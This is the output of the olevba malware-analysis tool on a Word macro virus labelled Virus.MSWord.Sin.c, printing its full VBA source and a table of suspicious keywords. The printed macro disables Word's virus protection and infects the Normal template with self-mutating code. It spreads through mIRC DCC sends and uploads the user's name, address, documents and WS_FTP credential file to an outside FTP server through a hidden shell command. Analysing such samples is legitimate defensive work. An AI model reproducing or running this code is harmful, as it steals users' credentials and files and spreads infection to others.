olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c-21c9c21e90b3c052fdb4b9ab51b7de1de67e8786
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c-21c9c21e90b3c052fdb4b9ab51b7de1de67e8786 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = wdDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
LordArz = "Technological Illusions"
NormInstalled = False
ActInstalled = False
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
If NormInstalled = False Then
Set Infection = NormCarrier
Set Carrier = ActCarrier
Else
Set Infection = ActCarrier
Set Carrier = NormCarrier
End If
DoEvents
Close
Tr1 = Dir(CurDir & "\script.ini", vbNormal)
Tr2 = UCase(Right(CurDir, 8))
Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
If Tr1 <> "" Then SDir = CurDir & "\script.ini"
If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
If SDir <> "" Then
Open SDir For Output As #1
Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
Close #1
End If
DoEvents
WinPath = Environ("WINDIR")
If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") >= Day(Date) + 14 Then
With Application.FileSearch
.FileName = "WS_FTP.ini"
.LookIn = "C" & Chr(58) & "\"
.SearchSubFolders = True
.MatchTextExactly = True
.FileType = msoFileTypeAllFiles
.Execute
WsPath = .FoundFiles(1)
End With
DoEvents
If ActiveDocument.HasPassword = True Then BCK = True
DoEvents
Open WinPath & "\" & Application.UserName & ".dat" For Output As #10
Print #10, Application.UserName
Print #10, Application.UserAddress
If BCK = True Then Print #10, ActiveDocument.FullName
If WsPath <> "" Then Print #10, "WS_FTP"
Close #10
Open WinPath & "\Command.$$$" For Output As #8
Print #8, "o ftp.xoom.com"
Print #8, "User SingOfScream"
Print #8, "Pass DIG001"
Print #8, "binary"
Print #8, "put " & Application.UserName & ".dat"
If WsPath <> "" Then Print #8, "put " & WsPath
If BCK = True Then Print #8, "put " & ActiveDocument.FullName
Print #8, "quit"
Close
Shell WinPath & "command.com /c FTP.exe -n -s:Command.$$$", vbHide
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = Day(Date)
End If
For x = 1 To ThisDocument.Variables.Count
ThisDocument.Variables(x).Delete
Next x
For x = 1 To Normal.ThisDocument.Variables.Count
Normal.ThisDocument.Variables(x).Delete
Next x
With Carrier
UECode = .Lines(1, 2) & Chr(13)
For x = 5 To .CountOfLines - 1
VCCode = .Lines(x, 1)
If VCCode = "End Sub" Then Exit For
For i = 1 To 20
If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
Next i
factor = ""
For Y = 1 To Int(Rnd * 6) + 6
factor = factor & Chr(Int(Rnd * 25) + 65)
Next Y
make_morph = factor & ": "
VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
Next x
VirCode = UECode & VirCode & "End Sub"
End With
Normal.ThisDocument.Variables.Add "VCode", VirCode
ResetMe = "Private Sub Document_Close()" & Chr(13)
ResetMe = ResetMe & String(150, Chr(9)) & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
ResetMe = ResetMe & "End Sub"
With ActCarrier
.DeleteLines 1, .CountOfLines
.InsertLines 1, ResetMe
End With
With NormCarrier
.DeleteLines 1, .CountOfLines
.InsertLines 1, ResetMe
End With
ActiveDocument.Save
NormalTemplate.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

